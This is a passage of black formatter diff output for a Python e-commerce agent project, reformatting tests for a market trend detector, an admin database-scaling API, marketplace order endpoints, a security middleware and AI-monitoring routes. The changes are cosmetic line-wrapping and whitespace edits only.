         price_data = [10.0, 11.0, 12.0]
         volume_data = [100, 120, 140]
         trend_type = trend_detector._detect_trend_type(price_data, volume_data)
         assert trend_type == "bullish_momentum"
-        
+
         # Test bearish momentum
         price_data = [12.0, 11.0, 10.0]
         volume_data = [100, 120, 140]
         trend_type = trend_detector._detect_trend_type(price_data, volume_data)
         assert trend_type == "bearish_momentum"
-        
+
         # Test sideways consolidation
         price_data = [10.0, 10.01, 10.02]
         volume_data = [100, 101, 102]
         trend_type = trend_detector._detect_trend_type(price_data, volume_data)
         assert trend_type == "sideways_consolidation"
@@ -173,67 +193,66 @@
         """Test trend confidence calculation."""
         # Test with stable prices (low volatility)
         price_data = [10.0, 10.1, 10.2, 10.3, 10.4]
         volume_data = [100, 110, 120, 130, 140]
         confidence = trend_detector._calculate_trend_confidence(price_data, volume_data)
-        
+
         assert 0 <= confidence <= 1
         assert confidence > 0.5  # Should be reasonably confident with stable trend
-        
+
         # Test with volatile prices
         price_data = [10.0, 15.0, 8.0, 12.0, 9.0]
         volume_data = [100, 110, 120, 130, 140]
         confidence = trend_detector._calculate_trend_confidence(price_data, volume_data)
-        
+
         assert 0 <= confidence <= 1
         assert confidence < 0.5  # Should be less confident with volatile data
 
     @pytest.mark.asyncio
     async def test_get_historical_trends(self, trend_detector, sample_trend_data):
         """Test getting historical trends."""
         # Add some trends to the detector
         trend_detector.trends = [sample_trend_data]
-        
+
         # Test 24h timeframe
         trends_24h = await trend_detector.get_historical_trends("24h")
         assert len(trends_24h) == 1
-        
+
         # Test 1h timeframe (should be empty since trend is older)
         trends_1h = await trend_detector.get_historical_trends("1h")
         assert len(trends_1h) == 0
 
     @pytest.mark.asyncio
     async def test_handle_event_data_acquired(self, trend_detector, sample_market_data):
         """Test handling DATA_ACQUIRED event."""
-        event = {
-            "type": EventType.DATA_ACQUIRED.value,
-            "data": sample_market_data
-        }
-        
-        with patch.object(trend_detector, 'analyze_trend') as mock_analyze:
-            with patch.object(trend_detector, '_send_trend_alert') as mock_alert:
+        event = {"type": EventType.DATA_ACQUIRED.value, "data": sample_market_data}
+
+        with patch.object(trend_detector, "analyze_trend") as mock_analyze:
+            with patch.object(trend_detector, "_send_trend_alert") as mock_alert:
                 mock_trend = TrendAnalysisData(
                     trend_type="upward_trend",
                     start_time=datetime.now(timezone.utc),
                     end_time=datetime.now(timezone.utc),
                     confidence=0.8,
-                    metadata={}
+                    metadata={},
                 )
                 mock_analyze.return_value = mock_trend
-                
+
                 await trend_detector._handle_event(event)
-                
+
                 mock_analyze.assert_called_once_with(sample_market_data)
                 mock_alert.assert_called_once_with(mock_trend)
                 assert len(trend_detector.trends) == 1
 
     @pytest.mark.asyncio
     async def test_send_trend_alert(self, trend_detector, sample_trend_data):
         """Test sending trend alert."""
-        with patch.object(trend_detector.alert_manager, 'process_alert') as mock_process:
+        with patch.object(
+            trend_detector.alert_manager, "process_alert"
+        ) as mock_process:
             await trend_detector._send_trend_alert(sample_trend_data)
-            
+
             mock_process.assert_called_once()
             alert_call = mock_process.call_args[0][0]
             assert isinstance(alert_call, Alert)
             assert alert_call.severity == AlertSeverity.LOW
             assert alert_call.alert_type == AlertType.CUSTOM
@@ -242,23 +261,23 @@
 
     @pytest.mark.asyncio
     async def test_parse_timeframe(self, trend_detector):
         """Test timeframe parsing."""
         now = datetime.now(timezone.utc)
-        
+
         # Test 1 hour
         cutoff_1h = trend_detector._parse_timeframe("1h")
         assert (now - cutoff_1h).total_seconds() == pytest.approx(3600, rel=1e-2)
-        
+
         # Test 24 hours
         cutoff_24h = trend_detector._parse_timeframe("24h")
         assert (now - cutoff_24h).total_seconds() == pytest.approx(86400, rel=1e-2)
-        
+
         # Test 7 days
         cutoff_7d = trend_detector._parse_timeframe("7d")
         assert (now - cutoff_7d).total_seconds() == pytest.approx(604800, rel=1e-2)
-        
+
         # Test default (unknown timeframe)
         cutoff_default = trend_detector._parse_timeframe("unknown")
         assert (now - cutoff_default).total_seconds() == pytest.approx(86400, rel=1e-2)
 
     @pytest.mark.asyncio
@@ -269,31 +288,31 @@
             TrendAnalysisData(
                 trend_type="upward_trend",
                 start_time=datetime.now(timezone.utc) - timedelta(hours=1),
                 end_time=datetime.now(timezone.utc),
                 confidence=0.8,
-                metadata={}
+                metadata={},
             ),
             TrendAnalysisData(
                 trend_type="upward_trend",
                 start_time=datetime.now(timezone.utc) - timedelta(hours=2),
                 end_time=datetime.now(timezone.utc),
                 confidence=0.7,
-                metadata={}
+                metadata={},
             ),
             TrendAnalysisData(
                 trend_type="downward_trend",
                 start_time=datetime.now(timezone.utc) - timedelta(hours=3),
                 end_time=datetime.now(timezone.utc),
                 confidence=0.6,
-                metadata={}
-            )
+                metadata={},
+            ),
         ]
         trend_detector.trends = trends
-        
+
         summary = await trend_detector.get_trend_summary()
-        
+
         assert summary["total_trends"] == 3
         assert summary["trend_distribution"]["upward_trend"] == 2
         assert summary["trend_distribution"]["downward_trend"] == 1
         assert summary["average_confidence"] == pytest.approx(0.7, rel=1e-2)
         assert summary["dominant_trend"] == "upward_trend"
@@ -304,16 +323,16 @@
         """Test price change calculation."""
         # Test positive change
         price_data = [10.0, 12.0]
         change = trend_detector._calculate_price_change(price_data)
         assert change == pytest.approx(0.2, rel=1e-2)
-        
+
         # Test negative change
         price_data = [12.0, 10.0]
         change = trend_detector._calculate_price_change(price_data)
         assert change == pytest.approx(-0.167, rel=1e-2)
-        
+
         # Test insufficient data
         price_data = [10.0]
         change = trend_detector._calculate_price_change(price_data)
         assert change == 0.0
 
@@ -322,21 +341,21 @@
         """Test volume change calculation."""
         # Test positive change
         volume_data = [100, 120]
         change = trend_detector._calculate_volume_change(volume_data)
         assert change == pytest.approx(0.2, rel=1e-2)
-        
+
         # Test empty data
         volume_data = []
         change = trend_detector._calculate_volume_change(volume_data)
         assert change == 0.0
 
     @pytest.mark.asyncio
     async def test_trend_analysis_data_to_dict(self, sample_trend_data):
         """Test TrendAnalysisData to_dict conversion."""
         result = sample_trend_data.to_dict()
-        
+
         assert result["trend_type"] == "upward_trend"
         assert result["confidence"] == 0.8
         assert "start_time" in result
         assert "end_time" in result
         assert "metadata" in result
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_trend_detector.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/admin/database_scaling.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/admin/database_scaling.py	2025-06-19 04:03:42.956952+00:00
@@ -25,11 +25,14 @@
 from fs_agt_clean.core.db.scaling_init import (
     DatabaseScalingSystem,
     get_database_scaling_system,
     initialize_database_scaling,
 )
-from fs_agt_clean.core.security.access_control import UserSession, get_current_user_session
+from fs_agt_clean.core.security.access_control import (
+    UserSession,
+    get_current_user_session,
+)
 from fs_agt_clean.core.utils.logging import get_logger
 from fs_agt_clean.services.metrics.service import MetricsService, get_metrics_service
 from fs_agt_clean.services.notifications.service import (
     NotificationService,
     get_notification_service,
@@ -45,42 +48,50 @@
 
 
 # Models for API requests and responses
 class ScalingStatusResponse(BaseModel):
     """Response model for scaling status."""
-    
+
     is_running: bool = Field(..., description="Whether the scaling system is running")
-    metrics: Dict[str, Dict[str, float]] = Field(..., description="Current database metrics")
-    scaling_status: Dict[str, Union[str, int, bool]] = Field(..., description="Scaling status")
+    metrics: Dict[str, Dict[str, float]] = Field(
+        ..., description="Current database metrics"
+    )
+    scaling_status: Dict[str, Union[str, int, bool]] = Field(
+        ..., description="Scaling status"
+    )
     replicas: Dict[str, Dict[str, any]] = Field(..., description="Replica status")
     config: Dict[str, any] = Field(..., description="Scaling configuration")
 
 
 class ScalingConfigUpdateRequest(BaseModel):
     """Request model for updating scaling configuration."""
-    
+
     enabled: Optional[bool] = Field(None, description="Whether scaling is enabled")
     mode: Optional[ScalingMode] = Field(None, description="Scaling mode")
-    min_pool_size: Optional[int] = Field(None, description="Minimum connection pool size")
-    max_pool_size: Optional[int] = Field(None, description="Maximum connection pool size")
+    min_pool_size: Optional[int] = Field(
+        None, description="Minimum connection pool size"
+    )
+    max_pool_size: Optional[int] = Field(
+        None, description="Maximum connection pool size"
+    )
     min_replicas: Optional[int] = Field(None, description="Minimum number of replicas")
     max_replicas: Optional[int] = Field(None, description="Maximum number of replicas")
     load_balancing_strategy: Optional[LoadBalancingStrategy] = Field(
         None, description="Load balancing strategy"
     )
 
 
 class ManualScalingRequest(BaseModel):
     """Request model for manual scaling operations."""
-    
+
     action: ScalingAction = Field(..., description="Scaling action to perform")
     pool_size: Optional[int] = Field(None, description="New connection pool size")
 
 
 class ReplicaConfigRequest(BaseModel):
     """Request model for replica configuration."""
-    
+
     host: str = Field(..., description="Hostname or IP address")
     port: int = Field(5432, description="Port number")
     username: str = Field(..., description="Username for connection")
     password: str = Field(..., description="Password for connection")
     database: str = Field(..., description="Database name")
@@ -89,11 +100,11 @@
     weight: int = Field(1, description="Weight for load balancing")
 
 
 class MetricsResponse(BaseModel):
     """Response model for database metrics."""
-    
+
     metrics: Dict[str, List[Dict[str, Union[str, float]]]] = Field(
         ..., description="Database metrics history"
     )
 
 
@@ -103,56 +114,56 @@
     notification_service: NotificationService = Depends(get_notification_service),
     user_session: UserSession = Depends(get_current_user_session),
 ) -> DatabaseScalingSystem:
     """
     Get the database scaling system.
-    
+
     Args:
         metrics_service: Metrics service
         notification_service: Notification service
         user_session: User session
-        
+
     Returns:
         The database scaling system
     """
     # Check if user has admin role
     if "admin" not in user_session.roles:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Admin role required",
         )
-    
+
     # Get or initialize scaling system
     scaling_system = get_database_scaling_system()
-    
+
     if not scaling_system:
         scaling_system = await initialize_database_scaling(
             metrics_service=metrics_service,
             notification_service=notification_service,
         )
-    
+
     return scaling_system
 
 
 # API endpoints
 @router.get("/status", response_model=ScalingStatusResponse)
 async def get_scaling_status(
     scaling_system: DatabaseScalingSystem = Depends(get_scaling_system),
 ) -> ScalingStatusResponse:
     """
     Get the current database scaling status.
-    
-    Args:
-        scaling_system: Database scaling system
-        
+
+    Args:
+        scaling_system: Database scaling system
+
     Returns:
         The current scaling status
     """
     try:
         # Get status from scaling system
         status = scaling_system.get_status()
-        
+
         # Format response
         return ScalingStatusResponse(
             is_running=status["is_running"],
             metrics=status["metrics_collector"]["metrics"],
             scaling_status=status["scaling_manager"],
@@ -172,47 +183,51 @@
     config: ScalingConfigUpdateRequest,
     scaling_system: DatabaseScalingSystem = Depends(get_scaling_system),
 ) -> Dict[str, str]:
     """
     Update the database scaling configuration.
-    
+
     Args:
         config: New scaling configuration
         scaling_system: Database scaling system
-        
+
     Returns:
         Success message
     """
     try:
         # Update configuration
         if config.enabled is not None:
             scaling_system.scaling_config.enabled = config.enabled
-            
+
             # Start or stop scaling system based on enabled flag
             if config.enabled and not scaling_system.is_running:
                 await scaling_system.start()
             elif not config.enabled and scaling_system.is_running:
                 await scaling_system.stop()
-        
+
         if config.mode is not None:
             scaling_system.scaling_config.mode = config.mode
-        
+
         if config.min_pool_size is not None:
-            scaling_system.scaling_config.thresholds.min_pool_size = config.min_pool_size
-        
+            scaling_system.scaling_config.thresholds.min_pool_size = (
+                config.min_pool_size
+            )
+
         if config.max_pool_size is not None:
-            scaling_system.scaling_config.thresholds.max_pool_size = config.max_pool_size
-        
+            scaling_system.scaling_config.thresholds.max_pool_size = (
+                config.max_pool_size
+            )
+
         if config.min_replicas is not None:
             scaling_system.scaling_config.thresholds.min_replicas = config.min_replicas
-        
+
         if config.max_replicas is not None:
             scaling_system.scaling_config.thresholds.max_replicas = config.max_replicas
-        
+
         if config.load_balancing_strategy is not None:
             scaling_system.load_balancer.set_strategy(config.load_balancing_strategy)
-        
+
         return {"message": "Scaling configuration updated successfully"}
     except Exception as e:
         logger.error("Error updating scaling configuration: %s", e)
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
@@ -225,59 +240,66 @@
     request: ManualScalingRequest,
     scaling_system: DatabaseScalingSystem = Depends(get_scaling_system),
 ) -> Dict[str, str]:
     """
     Perform a manual scaling operation.
-    
+
     Args:
         request: Manual scaling request
         scaling_system: Database scaling system
-        
+
     Returns:
         Success message
     """
     try:
         # Perform scaling action
-        if request.action == ScalingAction.INCREASE_POOL or request.action == ScalingAction.DECREASE_POOL:
+        if (
+            request.action == ScalingAction.INCREASE_POOL
+            or request.action == ScalingAction.DECREASE_POOL
+        ):
             if request.pool_size is None:
                 raise HTTPException(
                     status_code=status.HTTP_400_BAD_REQUEST,
                     detail="Pool size is required for pool scaling actions",
                 )
-            
-            success = await scaling_system.scaling_manager.manual_scale_pool(request.pool_size)
-            
+
+            success = await scaling_system.scaling_manager.manual_scale_pool(
+                request.pool_size
+            )
+
             if not success:
                 raise HTTPException(
                     status_code=status.HTTP_400_BAD_REQUEST,
                     detail="Failed to scale connection pool",
                 )
-            
-            return {"message": f"Connection pool scaled to {request.pool_size} connections"}
-        
+
+            return {
+                "message": f"Connection pool scaled to {request.pool_size} connections"
+            }
+
         elif request.action == ScalingAction.ADD_REPLICA:
             success = await scaling_system.scaling_manager.manual_add_replica()
-            
+
             if not success:
                 raise HTTPException(
                     status_code=status.HTTP_400_BAD_REQUEST,
                     detail="Failed to add replica",
                 )
-            
+
             return {"message": "Replica added successfully"}
-        
+
         elif request.action == ScalingAction.REMOVE_REPLICA:
             success = await scaling_system.scaling_manager.manual_remove_replica()
-            
+
             if not success:
                 raise HTTPException(
                     status_code=status.HTTP_400_BAD_REQUEST,
                     detail="Failed to remove replica",
                 )
-            
+
             return {"message": "Replica removed successfully"}
-        
+
         else:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
                 detail=f"Unsupported scaling action: {request.action}",
             )
@@ -296,22 +318,22 @@
     request: ReplicaConfigRequest,
     scaling_system: DatabaseScalingSystem = Depends(get_scaling_system),
 ) -> Dict[str, str]:
     """
     Add a new database replica.
-    
+
     Args:
         request: Replica configuration
         scaling_system: Database scaling system
-        
+
     Returns:
         Success message
     """
     try:
         # Create replica ID
         replica_id = f"replica-{len(scaling_system.scaling_config.replicas) + 1}"
-        
+
         # Create replica config
         replica_config = ReplicaConfig(
             id=replica_id,
             host=request.host,
             port=request.port,
@@ -322,20 +344,20 @@
             max_overflow=request.max_overflow,
             is_active=True,
             is_read_only=True,
             weight=request.weight,
         )
-        
+
         # Add replica
         success = await scaling_system.load_balancer.add_replica(replica_config)
-        
+
         if not success:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
                 detail="Failed to add replica",
             )
-        
+
         return {"message": f"Replica {replica_id} added successfully"}
     except HTTPException:
         raise
     except Exception as e:
         logger.error("Error adding replica: %s", e)
@@ -350,28 +372,28 @@
     replica_id: str,
     scaling_system: DatabaseScalingSystem = Depends(get_scaling_system),
 ) -> Dict[str, str]:
     """
     Remove a database replica.
-    
+
     Args:
         replica_id: Replica ID
         scaling_system: Database scaling system
-        
+
     Returns:
         Success message
     """
     try:
         # Remove replica
         success = await scaling_system.load_balancer.remove_replica(replica_id)
-        
+
         if not success:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
                 detail=f"Failed to remove replica {replica_id}",
             )
-        
+
         return {"message": f"Replica {replica_id} removed successfully"}
     except HTTPException:
         raise
     except Exception as e:
         logger.error("Error removing replica: %s", e)
@@ -381,32 +403,34 @@
         )
 
 
 @router.get("/metrics", response_model=MetricsResponse)
 async def get_database_metrics(
-    metric_names: Optional[List[str]] = Query(None, description="Metric names to filter"),
+    metric_names: Optional[List[str]] = Query(
+        None, description="Metric names to filter"
+    ),
     window_seconds: int = Query(300, description="Time window in seconds"),
     scaling_system: DatabaseScalingSystem = Depends(get_scaling_system),
 ) -> MetricsResponse:
     """
     Get database metrics history.
-    
+
     Args:
         metric_names: Optional list of metric names to filter
         window_seconds: Time window in seconds
         scaling_system: Database scaling system
-        
+
     Returns:
         Database metrics history
     """
     try:
         # Get metrics history
         metrics = await scaling_system.metrics_collector.get_metrics_history(
             metric_names=metric_names,
             window_seconds=window_seconds,
         )
-        
+
         return MetricsResponse(metrics=metrics)
     except Exception as e:
         logger.error("Error getting database metrics: %s", e)
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/admin/database_scaling.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/endpoints/marketplace_integration.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/endpoints/marketplace_integration.py	2025-06-19 04:03:42.988036+00:00
@@ -54,11 +54,11 @@
 
     return EbayService(
         config=config,
         api_client=api_client,
         metrics_service=metrics_service,
-        notification_service=notification_service
+        notification_service=notification_service,
     )
 
 
 async def get_inventory_service() -> InventoryManagementService:
     """Get the inventory service instance."""
@@ -72,30 +72,32 @@
     notification_service = get_notification_service()
 
     return InventoryManagementService(
         database=database,
         metrics_service=metrics_service,
-        notification_service=notification_service
+        notification_service=notification_service,
     )
 
 
 async def get_order_service() -> OrderService:
     """Get the order service instance."""
     # Use the real implementation through the compatibility layer
     from fs_agt_clean.core.db.database import get_database
     from fs_agt_clean.core.metrics.service import get_metrics_service
     from fs_agt_clean.services.notifications.service import get_notification_service
-    from fs_agt_clean.services.order.compat import get_order_service as get_real_order_service
+    from fs_agt_clean.services.order.compat import (
+        get_order_service as get_real_order_service,
+    )
 
     database = get_database()
     metrics_service = get_metrics_service()
     notification_service = get_notification_service()
 
     return get_real_order_service(
         database=database,
         metrics_service=metrics_service,
-        notification_service=notification_service
+        notification_service=notification_service,
     )
 
 
 @router.get("/products", response_model=List[Dict[str, Any]])
 async def get_products(
@@ -433,17 +435,16 @@
         if order_status:
             filters["status"] = order_status
 
         # Get orders using the real implementation
         orders = await order_service.get_orders(
-            user_id=current_user.id,
-            filters=filters
+            user_id=current_user.id, filters=filters
         )
 
         # Apply pagination (the repository might not support it yet)
         if orders and len(orders) > offset:
-            orders = orders[offset:offset + limit]
+            orders = orders[offset : offset + limit]
 
         return orders
     except Exception as e:
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
@@ -474,23 +475,20 @@
     try:
         # Update the order with shipping information
         updated_order = await order_service.update_shipping_info(
             order_id=order_id,
             tracking_number=fulfillment_data.get("tracking_number"),
-            carrier=fulfillment_data.get("carrier")
+            carrier=fulfillment_data.get("carrier"),
         )
 
         if not updated_order:
             raise ValueError(f"Order {order_id} not found")
 
         # Update the order status to shipped
         await order_service.update_order(
             order_id=order_id,
-            data={
-                "status": "shipped",
-                "notes": fulfillment_data.get("notes", "")
-            }
+            data={"status": "shipped", "notes": fulfillment_data.get("notes", "")},
         )
 
         return {
             "status": "success",
             "message": "Order fulfilled successfully",
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/endpoints/marketplace_integration.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/security_middleware.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/security_middleware.py	2025-06-19 04:03:43.067961+00:00
@@ -24,11 +24,11 @@
 
 from fs_agt_clean.core.security.security_hardening import (
     rate_limiter,
     input_validator,
     threat_detector,
-    SecurityEvent
+    SecurityEvent,
 )
 
 logger = logging.getLogger(__name__)
 
 # Default security headers that should be applied to all responses
@@ -312,78 +312,92 @@
 
         try:
             # 1. Check if IP is marked as suspicious
             if threat_detector.is_suspicious_ip(client_ip):
                 threat_score = threat_detector.get_threat_score(client_ip)
-                logger.warning(f"Blocking request from suspicious IP {client_ip} (threat score: {threat_score})")
+                logger.warning(
+                    f"Blocking request from suspicious IP {client_ip} (threat score: {threat_score})"
+                )
 
                 # Record security event
-                threat_detector.record_security_event(SecurityEvent(
-                    event_type="blocked_request",
-                    source_ip=client_ip,
-                    user_id=getattr(request.state, "user_id", None),
-                    endpoint=request.url.path,
-                    timestamp=start_time,
-                    severity="high",
-                    details={"reason": "suspicious_ip", "threat_score": threat_score}
-                ))
+                threat_detector.record_security_event(
+                    SecurityEvent(
+                        event_type="blocked_request",
+                        source_ip=client_ip,
+                        user_id=getattr(request.state, "user_id", None),
+                        endpoint=request.url.path,
+                        timestamp=start_time,
+                        severity="high",
+                        details={
+                            "reason": "suspicious_ip",
+                            "threat_score": threat_score,
+                        },
+                    )
+                )
 
                 return JSONResponse(
                     status_code=429,
-                    content={"detail": "Request blocked due to suspicious activity"}
+                    content={"detail": "Request blocked due to suspicious activity"},
                 )
 
             # 2. Rate limiting check
             if not await rate_limiter.check_rate_limit(request):
-                logger.warning(f"Rate limit exceeded for {client_ip} on {request.url.path}")
+                logger.warning(
+                    f"Rate limit exceeded for {client_ip} on {request.url.path}"
+                )
 
                 # Record security event
-                threat_detector.record_security_event(SecurityEvent(
-                    event_type="rate_limit_exceeded",
+                threat_detector.record_security_event(
+                    SecurityEvent(
+                        event_type="rate_limit_exceeded",
+                        source_ip=client_ip,
+                        user_id=getattr(request.state, "user_id", None),
+                        endpoint=request.url.path,
+                        timestamp=start_time,
+                        severity="medium",
+                        details={"method": request.method},
+                    )
+                )
+
+                return JSONResponse(
+                    status_code=429, content={"detail": "Rate limit exceeded"}
+                )
+
+            # 3. Input validation for POST/PUT/PATCH requests
+            if request.method in ["POST", "PUT", "PATCH"]:
+                await self._validate_request_input(request, client_ip, start_time)
+
+            # Process the request
+            response = await call_next(request)
+
+            # Add security headers if not already present
+            self._add_security_headers(response)
+
+            return response
+
+        except Exception as e:
+            logger.error(f"Security middleware error: {e}")
+
+            # Record security event for errors
+            threat_detector.record_security_event(
+                SecurityEvent(
+                    event_type="middleware_error",
                     source_ip=client_ip,
                     user_id=getattr(request.state, "user_id", None),
                     endpoint=request.url.path,
                     timestamp=start_time,
                     severity="medium",
-                    details={"method": request.method}
-                ))
-
-                return JSONResponse(
-                    status_code=429,
-                    content={"detail": "Rate limit exceeded"}
-                )
-
-            # 3. Input validation for POST/PUT/PATCH requests
-            if request.method in ["POST", "PUT", "PATCH"]:
-                await self._validate_request_input(request, client_ip, start_time)
-
-            # Process the request
-            response = await call_next(request)
-
-            # Add security headers if not already present
-            self._add_security_headers(response)
-
-            return response
-
-        except Exception as e:
-            logger.error(f"Security middleware error: {e}")
-
-            # Record security event for errors
-            threat_detector.record_security_event(SecurityEvent(
-                event_type="middleware_error",
-                source_ip=client_ip,
-                user_id=getattr(request.state, "user_id", None),
-                endpoint=request.url.path,
-                timestamp=start_time,
-                severity="medium",
-                details={"error": str(e)}
-            ))
+                    details={"error": str(e)},
+                )
+            )
 
             # Continue with request processing
             return await call_next(request)
 
-    async def _validate_request_input(self, request: Request, client_ip: str, start_time: datetime):
+    async def _validate_request_input(
+        self, request: Request, client_ip: str, start_time: datetime
+    ):
         """Validate request input for security threats."""
         try:
             # Get request body if present
             if hasattr(request, "_body"):
                 body = request._body
@@ -397,29 +411,34 @@
 
                     # Validate the data
                     validation_result = input_validator.validate_request_data(data)
 
                     if not validation_result["valid"]:
-                        logger.warning(f"Suspicious input detected from {client_ip}: {validation_result['warnings']}")
+                        logger.warning(
+                            f"Suspicious input detected from {client_ip}: {validation_result['warnings']}"
+                        )
 
                         # Record security event
-                        threat_detector.record_security_event(SecurityEvent(
-                            event_type="suspicious_input",
-                            source_ip=client_ip,
-                            user_id=getattr(request.state, "user_id", None),
-                            endpoint=request.url.path,
-                            timestamp=start_time,
-                            severity="high",
-                            details={
-                                "blocked_patterns": validation_result["blocked_patterns"],
-                                "warnings": validation_result["warnings"]
-                            }
-                        ))
+                        threat_detector.record_security_event(
+                            SecurityEvent(
+                                event_type="suspicious_input",
+                                source_ip=client_ip,
+                                user_id=getattr(request.state, "user_id", None),
+                                endpoint=request.url.path,
+                                timestamp=start_time,
+                                severity="high",
+                                details={
+                                    "blocked_patterns": validation_result[
+                                        "blocked_patterns"
+                                    ],
+                                    "warnings": validation_result["warnings"],
+                                },
+                            )
+                        )
 
                         raise HTTPException(
-                            status_code=400,
-                            detail="Invalid input detected"
+                            status_code=400, detail="Invalid input detected"
                         )
 
                 except json.JSONDecodeError:
                     # Not JSON data, skip validation
                     pass
@@ -450,11 +469,11 @@
         """Add additional security headers to response."""
         # Add security headers if not already present
         security_headers = {
             "X-Security-Hardened": "true",
             "X-Rate-Limited": "true",
-            "X-Input-Validated": "true"
+            "X-Input-Validated": "true",
         }
 
         for header, value in security_headers.items():
             if header not in response.headers:
                 response.headers[header] = value
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/security_middleware.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/ai_monitoring.py	2025-06-16 17:03:13.532113+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/ai_monitoring.py	2025-06-19 04:03:43.323462+00:00
@@ -12,11 +12,11 @@
 from fastapi.responses import JSONResponse
 
 from fs_agt_clean.core.monitoring.ai_performance_monitor import (
     get_ai_performance_monitor,
     get_ai_health_status,
-    get_ai_performance_summary
+    get_ai_performance_summary,
 )
 
 logger = logging.getLogger(__name__)
 
 router = APIRouter()
@@ -33,98 +33,110 @@
         raise HTTPException(status_code=500, detail="Failed to get AI health status")
 
 
 @router.get("/performance")
 async def get_ai_performance(
-    last_n_requests: int = Query(default=100, ge=1, le=1000, description="Number of recent requests to analyze")
+    last_n_requests: int = Query(
+        default=100, ge=1, le=1000, description="Number of recent requests to analyze"
+    )
 ) -> Dict[str, Any]:
     """Get AI performance summary for recent requests."""
     try:
         performance_summary = get_ai_performance_summary(last_n_requests)
         return performance_summary
     except Exception as e:
         logger.error(f"Error getting AI performance summary: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get AI performance summary")
+        raise HTTPException(
+            status_code=500, detail="Failed to get AI performance summary"
+        )
 
 
 @router.get("/metrics")
 async def get_ai_metrics(
     format: str = Query(default="json", description="Export format (json)")
 ) -> Dict[str, Any]:
     """Get detailed AI performance metrics."""
     try:
         monitor = get_ai_performance_monitor()
-        
+
         if format == "json":
             metrics_json = monitor.export_metrics(format="json")
             return {"format": "json", "data": metrics_json}
         else:
             raise HTTPException(status_code=400, detail=f"Unsupported format: {format}")
-            
+
     except Exception as e:
         logger.error(f"Error exporting AI metrics: {e}")
         raise HTTPException(status_code=500, detail="Failed to export AI metrics")
 
 
 @router.get("/status")
 async def get_ai_monitoring_status() -> Dict[str, Any]:
     """Get AI monitoring system status."""
     try:
         monitor = get_ai_performance_monitor()
-        
+
         return {
             "monitoring_enabled": True,
             "metrics_count": len(monitor.metrics_history),
             "max_history": monitor.max_history,
             "alerts_enabled": monitor.alerts_enabled,
             "alert_thresholds": monitor.alert_thresholds,
-            "last_updated": monitor.metrics_history[-1].timestamp if monitor.metrics_history else None
+            "last_updated": (
+                monitor.metrics_history[-1].timestamp
+                if monitor.metrics_history
+                else None
+            ),
         }
     except Exception as e:
         logger.error(f"Error getting AI monitoring status: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get AI monitoring status")
+        raise HTTPException(
+            status_code=500, detail="Failed to get AI monitoring status"
+        )
 
 
 @router.post("/test")
 async def test_ai_performance() -> Dict[str, Any]:
     """Test AI performance with a simple request."""
     try:
-        from fs_agt_clean.core.ai.simple_llm_client import SimpleLLMClientFactory, ModelType
+        from fs_agt_clean.core.ai.simple_llm_client import (
+            SimpleLLMClientFactory,
+            ModelType,
+        )
         import time
-        
+
         # Create a test client
         client = SimpleLLMClientFactory.create_ollama_client(
-            model_type=ModelType.GEMMA_7B,
-            temperature=0.7
-        )
-        
+            model_type=ModelType.GEMMA_7B, temperature=0.7
+        )
+
         # Test prompt
         test_prompt = "Hello, this is a test."
-        
+
         # Measure performance
         start_time = time.time()
         try:
             response = await client.generate_response(prompt=test_prompt)
             success = True
             error_message = None
         except Exception as e:
             response = None
             success = False
             error_message = str(e)
-        
+
         response_time = time.time() - start_time
-        
+
         return {
             "test_completed": True,
             "success": success,
             "response_time": response_time,
             "error_message": error_message,
             "response_preview": response.content[:100] if response else None,
             "model": client.model,
-            "provider": client.provider.value
-        }
-        
+            "provider": client.provider.value,
+        }
+
     except Exception as e:
         logger.error(f"Error testing AI performance: {e}")
         raise HTTPException(status_code=500, detail="Failed to test AI performance")
 
 
@@ -133,15 +145,15 @@
     """Clear all stored AI performance metrics."""
     try:
         monitor = get_ai_performance_monitor()
         metrics_count = len(monitor.metrics_history)
         monitor.clear_metrics()
-        
+
         return {
             "cleared": True,
             "metrics_cleared": metrics_count,
-            "message": f"Cleared {metrics_count} performance metrics"
+            "message": f"Cleared {metrics_count} performance metrics",
         }
     except Exception as e:
         logger.error(f"Error clearing AI metrics: {e}")
         raise HTTPException(status_code=500, detail="Failed to clear AI metrics")
 
@@ -149,46 +161,58 @@
 @router.get("/alerts")
 async def get_ai_alerts() -> Dict[str, Any]:
     """Get current AI alert configuration and recent alerts."""
     try:
         monitor = get_ai_performance_monitor()
-        
+
         # Get recent failed requests as alerts
         recent_metrics = list(monitor.metrics_history)[-50:]  # Last 50 requests
         alerts = []
-        
+
         for metrics in recent_metrics:
             if not metrics.success:
-                alerts.append({
-                    "timestamp": metrics.timestamp,
-                    "type": "error",
-                    "message": f"AI request failed: {metrics.error_message}",
-                    "model": metrics.model_name,
-                    "response_time": metrics.response_time
-                })
-            elif metrics.response_time >= monitor.alert_thresholds["response_time_critical"]:
-                alerts.append({
-                    "timestamp": metrics.timestamp,
-                    "type": "critical",
-                    "message": f"Critical response time: {metrics.response_time:.1f}s",
-                    "model": metrics.model_name,
-                    "response_time": metrics.response_time
-                })
-            elif metrics.response_time >= monitor.alert_thresholds["response_time_warning"]:
-                alerts.append({
-                    "timestamp": metrics.timestamp,
-                    "type": "warning",
